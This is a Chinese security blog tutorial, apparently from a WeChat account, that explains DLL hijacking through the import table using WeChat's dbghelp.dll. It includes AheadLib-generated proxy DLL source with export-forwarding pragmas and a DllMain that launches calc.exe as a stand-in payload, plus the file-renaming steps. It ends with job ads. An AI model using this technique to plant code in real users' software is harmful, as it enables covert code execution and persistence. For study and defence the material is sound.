> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Ixi4SLykBvu_IX_IpJ_tOg)

**STATEMENT**

**声明**

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。

雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

**dll 劫持 - 劫持 exe 导入表中的 dll**  

当一个可执行文件运行时，Windows 加载器会将 PE 文件映射到内存中，然后分析可执行文件的导入表，并将相应的 DLL 文件装入，EXE 文件通过导入表找到 DLL 中相应的函数，从而运行相应的函数。

  
比如我们先来看一个可执行文件的导入表。

  
可以使用 https://ntcore.com/files/CFF_Explorer.zip  
将可执行文件导入此工具。

  
这里我就将微信导入进去了

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUCrxmaXFe6WxjNqD5BlyUtue96JGR5uDnzGnvAsIdvDlfmRyksxGF0EjQDbWYXZ0e0eoMC8SnibicQ/640?wx_fmt=png)

找到一个系统 Knows 表中没有的 dll，为什么不劫持 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs 中的 dll？

  
是因为这些 dll 劫持难度较大，Know DLLs 注册表项里的 DLL 列表在应用程序运行后就已经加入到了内核空间中，多个进程公用这些模块，必须具有非常高的权限才能修改。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUCrxmaXFe6WxjNqD5BlyUtBXNfa22UR5wzBg8iazKqnumarH7lCWAcYbhkbElhWJX59I3CDuwwEng/640?wx_fmt=png)

dbghelp.dll 是没出现在 knowndlls 中的，我们可以在当前文件夹中找到它。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUCrxmaXFe6WxjNqD5BlyUtLIReVdvicqZ828PmWiauicUlwNrmsRTd2wribBNa3ttFrOdeicEoyibEvfcw/640?wx_fmt=png)

那我们就劫持这个 dll，接下来需要借助 aheadlib 这个工具去完成劫持，下载地址：

https://pan.baidu.com/s/1ulNXz-EQEyDVL2tXE2G5sg 

提取码: t3kp

**直接转发**

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUCrxmaXFe6WxjNqD5BlyUtQVe4MoA97Hn0YXkLOyQOibJa7XP5YwWlOQQN18KibeibTvVqaDlo59fmQ/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUCrxmaXFe6WxjNqD5BlyUtPeoz5WLECwH8F1olcqZicDXpcSZ1BicfnZNFuWjrqNHydRJSxsuo4ZTQ/640?wx_fmt=png)

如果输出那块报错了 那么可以尝试低权限的路径，原始的 dll 名字叫 dbghelporg

  
生成之后我们 去打开它看看

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUCrxmaXFe6WxjNqD5BlyUt1yPaBcZ8sXlk07sMdCqY8CkGutLlAmSFg15ze3LfB0q1hDRzE8rFqg/640?wx_fmt=png)

最后有个入口函数

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUCrxmaXFe6WxjNqD5BlyUt3oKCCu9a3rGxxJsRWhuINWHOBCzbATsEHTUFJOpxqj4TKaASFzDWFQ/640?wx_fmt=png)

我们在入口函数中写一些恶意代码，然后新建个 dll 给他编译下

  
要在头文件中的 pch.h 中加入 # include <stdlib.h>

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUCrxmaXFe6WxjNqD5BlyUtNNCicEESxtC9X5MFE82B9S5iaOLvwYrlmTvLZzqZHNswNibyibGrUyLgicA/640?wx_fmt=png)

```
# include "pch.h"
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 导出函数
# pragma comment(linker, "/EXPORT:SymGetOmapBlockBase=dbghelporg.SymGetOmapBlockBase,@1")
# pragma comment(linker, "/EXPORT:DbgHelpCreateUserDump=dbghelporg.DbgHelpCreateUserDump,@2")
# pragma comment(linker, "/EXPORT:DbgHelpCreateUserDumpW=dbghelporg.DbgHelpCreateUserDumpW,@3")
.......
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 入口函数
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
{
  if (dwReason == DLL_PROCESS_ATTACH)
  {
    DisableThreadLibraryCalls(hModule);
    system("calc");
  }
  else if (dwReason == DLL_PROCESS_DETACH)
  {
  }

  return TRUE;
}
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUCrxmaXFe6WxjNqD5BlyUtoUPxwnblyDnFMDLn33XIsqxb5UgQrSJ8DPxzHWIMu3Ge6V0NdOknoA/640?wx_fmt=png)

然后将原本的 dbghelp.dll 改名为 dbghelporg.dll  
将我们刚刚编译好的 dll 改名为 dbghelp.dll  
然后直接运行 weichat.exe

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUCrxmaXFe6WxjNqD5BlyUtPXo6UJJaYQttnibQibIhTQKicVOEd1gY1tsyge5h1AL1SsCYFh5K0TO7Q/640?wx_fmt=png)

通过代码去分析劫持的原理：  
可以看见使用# pragma comment(linker, "/EXPORT:omap=dbghelporg.omap,@199")  
这是常见的导出函数写法之一，只不过后面跟了个定义。

  
当主程序想要调用 dll 中的 omap 函数的时候，得先去 loadlibrary, 去加载这个 dll，然是在加载的时候根据 linker, "/EXPORT:omap=dbghelporg.omap,@199" 就会去加载原始的 dll dbghelporg.dll 这个时候其实就已经转发了，  
如何证明这一点呢？

  
我们把原始 dll 删去，然后执行 wechat.exe

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUCrxmaXFe6WxjNqD5BlyUtka4J9cOTibE3w5IbKWewhn9Z4oCc7F7nZB1CNpwCTsetuEBPbYJ9tiaQ/640?wx_fmt=png)

LoadLibrary 可用于将库模块加载到进程的地址空间中，结果转发的时候找不到原始的 dll，导致运行出错。

**即时调用**

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUCrxmaXFe6WxjNqD5BlyUthO4kjJl4xK3ZWNXydpLIux6I2y70Ly3CthOWYUHRnHx1S9vWxk1sNA/640?wx_fmt=png)

用 Visual Studio 2019 去修改下  
下面是需要改动的地方

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUCrxmaXFe6WxjNqD5BlyUtQakibiaV2xRForoOgeGaWsUiaRbdWprgImmgoWbicK1ARSo4PIPV5ibNndQ/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUCrxmaXFe6WxjNqD5BlyUtiagmg0ibibmbSzRVj7wAyXnN0ftl4SFUT3CtN4SllwZ0oxWO3kNpF0iakQ/640?wx_fmt=png)

然后将原本的 dbghelp.dll 改名为 dbghelporg.dll  
将我们刚刚编译好的 dll 改名为 dbghelp.dll  
直接启动 wechat.exe

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUCrxmaXFe6WxjNqD5BlyUt2xMUCcmgCjhMhpJUgibESUdfpNuqjyCiae1azl2aAoZqNaGaKBmStQNA/640?wx_fmt=png)

根据源码去分析原理：  
首先调用导出函数之前得经历初始化 Dllmain

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUCrxmaXFe6WxjNqD5BlyUtpGbUukLEOapiazpfwQROtibw09uOKkCgnHwrQvB75wbkxD9QKeJMgUfg/640?wx_fmt=png)

return 到 load 函数  
load 函数加载原始 dll 去初始化程序的所有导出函数的地址

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUCrxmaXFe6WxjNqD5BlyUtQCmMu7ftxgo3tUa6xnLdSqhpBSfxgNiaTdM9qh1Sj7oJBUTQhaRiaJuA/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUCrxmaXFe6WxjNqD5BlyUtT2XAe95WsoSsuAP5v8VTfgetrllHcMoG15M0bpNqoDYT2rjpicpAyhg/640?wx_fmt=png)

在这里直接 getaddress 函数去获取所有导出函数的地址  
继续跟到 getprocaddress 函数中去取地址

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUCrxmaXFe6WxjNqD5BlyUtS6CRPsKlYgRjicHnCKRL2IcibsAtVT4LWKdNnibOK9UIDMPeIvsBmKYMQ/640?wx_fmt=png)

最后我们再来看看导出函数 定义的就是指向该代码中的函数，以 SymGetOmapBlockBase 函数为例

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUCrxmaXFe6WxjNqD5BlyUtVUkfsspiaM7LxOsCdPnRaRsgFwFGmAia2VY0SEOoz1mbaib13YibQWrvCA/640?wx_fmt=png)

主程序要调用 SymGetOmapBlockBase 函数，直接就可以获取到原始 dll 中 SymGetOmapBlockBase 函数的地址，然后 jmp 到内存中原始 dll 的那个导出函数的地址，去完成相应功能。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUCrxmaXFe6WxjNqD5BlyUtNhlNmQLI3TsvRsPicBdamW2a8T04Hxq4D7Pcgjqe4H6La4BCJs8Z9iag/640?wx_fmt=png)

对比之前用直接转发出来的 cpp，对比之前用直接转发出来的 cpp，直接转发对主程序来说 其实就是调用了原来 dll 的某个函数。

  
但是即时调用实际上是调用了劫持 dll 的某个函数 只不过那个函数会 jmp 到原本的 dll 中的相应函数的地址。  
达到的效果相同 但是实现的原理不同。

到此劫持导入表中的 dll 两种方式都完成了。

**参考链接**  
https://www.cnblogs.com/cswuyg/archive/2011/09/30/dll.html  
https://cloud.tencent.com/developer/article/1005669  
https://www.cnblogs.com/punished/p/14715771.html

**参考书籍**  
《windows 核心编程 (第五版)》

**RECRUITMENT**

**招聘启事**

**安恒雷神众测 SRC 运营（实习生）**  
————————  
【职责描述】  
1.  负责 SRC 的微博、微信公众号等线上新媒体的运营工作，保持用户活跃度，提高站点访问量；  
2.  负责白帽子提交漏洞的漏洞审核、Rank 评级、漏洞修复处理等相关沟通工作，促进审核人员与白帽子之间友好协作沟通；  
3.  参与策划、组织和落实针对白帽子的线下活动，如沙龙、发布会、技术交流论坛等；  
4.  积极参与雷神众测的品牌推广工作，协助技术人员输出优质的技术文章；  
5.  积极参与公司媒体、行业内相关媒体及其他市场资源的工作沟通工作。  
【任职要求】   
 1.  责任心强，性格活泼，具备良好的人际交往能力；  
 2.  对网络安全感兴趣，对行业有基本了解；  
 3.  良好的文案写作能力和活动组织协调能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

**设计师（实习生）**  

————————

【职位描述】  
负责设计公司日常宣传图片、软文等与设计相关工作，负责产品品牌设计。  
【职位要求】  
1、从事平面设计相关工作 1 年以上，熟悉印刷工艺；具有敏锐的观察力及审美能力，及优异的创意设计能力；有 VI 设计、广告设计、画册设计等专长；  
2、有良好的美术功底，审美能力和创意，色彩感强；

3、精通 photoshop/illustrator/coreldrew / 等设计制作软件；  
4、有品牌传播、产品设计或新媒体视觉工作经历；  
【关于岗位的其他信息】  
企业名称：杭州安恒信息技术股份有限公司  
办公地点：杭州市滨江区安恒大厦 19 楼  
学历要求：本科及以上  
工作年限：1 年及以上，条件优秀者可放宽

简历投递至 

bountyteam@dbappsecurity.com.cn

安全招聘  

————————  
公司：安恒信息  
岗位：**Web 安全 安全研究员**  
部门：战略支援部  
薪资：13-30K  
工作年限：1 年 +  
工作地点：杭州（总部）、广州、成都、上海、北京

工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…  
【岗位职责】  
1. 定期面向部门、全公司技术分享;  
2. 前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；  
3. 负责完成部门渗透测试、红蓝对抗业务;  
4. 负责自动化平台建设  
5. 负责针对常见 WAF 产品规则进行测试并落地 bypass 方案  
【岗位要求】  
1. 至少 1 年安全领域工作经验；  
2. 熟悉 HTTP 协议相关技术  
3. 拥有大型产品、CMS、厂商漏洞挖掘案例；  
4. 熟练掌握 php、java、asp.net 代码审计基础（一种或多种）  
5. 精通 Web Fuzz 模糊测试漏洞挖掘技术  
6. 精通 OWASP TOP 10 安全漏洞原理并熟悉漏洞利用方法  
7. 有过独立分析漏洞的经验，熟悉各种 Web 调试技巧  
8. 熟悉常见编程语言中的至少一种（Asp.net、Python、php、java）  
【加分项】  
1. 具备良好的英语文档阅读能力；  
2. 曾参加过技术沙龙担任嘉宾进行技术分享；  
3. 具有 CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP、OSCP 等安全相关资质者；  
4. 具有大型 SRC 漏洞提交经验、获得年度表彰、大型 CTF 夺得名次者；  
5. 开发过安全相关的开源项目；  
6. 具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；  
7. 个人技术博客；  
8. 在优质社区投稿过文章；

岗位：**安全红队武器自动化工程师**  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 熟练使用 Python、java、c/c++ 等至少一门语言作为主要开发语言；  
2. 熟练使用 Django、flask 等常用 web 开发框架、以及熟练使用 mysql、mongoDB、redis 等数据存储方案；  
3: 熟悉域安全以及内网横向渗透、常见 web 等漏洞原理；  
4. 对安全技术有浓厚的兴趣及热情，有主观研究和学习的动力；  
5. 具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。

简历投递至

bountyteam@dbappsecurity.com.cn

岗位：**红队武器化 Golang 开发工程师**  

薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 掌握 C/C++/Java/Go/Python/JavaScript 等至少一门语言作为主要开发语言；  
2. 熟练使用 Gin、Beego、Echo 等常用 web 开发框架、熟悉 MySQL、Redis、MongoDB 等主流数据库结构的设计, 有独立部署调优经验；  
3. 了解 docker，能进行简单的项目部署；  
3. 熟悉常见 web 漏洞原理，并能写出对应的利用工具；  
4. 熟悉 TCP/IP 协议的基本运作原理；  
5. 对安全技术与开发技术有浓厚的兴趣及热情，有主观研究和学习的动力，具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式、消息队列等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。  
简历投递至

bountyteam@dbappsecurity.com.cn

END

![图片](https://mmbiz.qpic.cn/mmbiz_gif/CtGxzWjGs5uX46SOybVAyYzY0p5icTsasu9JSeiaic9ambRjmGVWuvxFbhbhPCQ34sRDicJwibicBqDzJQx8GIM3AQXQ/640?wx_fmt=gif)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JU4Y1uMACWBUJcgxvjRiazpicGetdxMsiaBBVRusMicibFXjLDkOuOupDInvSaWtZT6kFDiaZ3NBJZaqzYQ/640?wx_fmt=jpeg)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/0BNKhibhMh8eiasiaBAEsmWfxYRZOZdgDBevusQUZzjTCG5QB8B4wgy8TSMiapKsHymVU4PnYYPrSgtQLwArW5QMUA/640?wx_fmt=gif)

**长按识别二维码关注我们**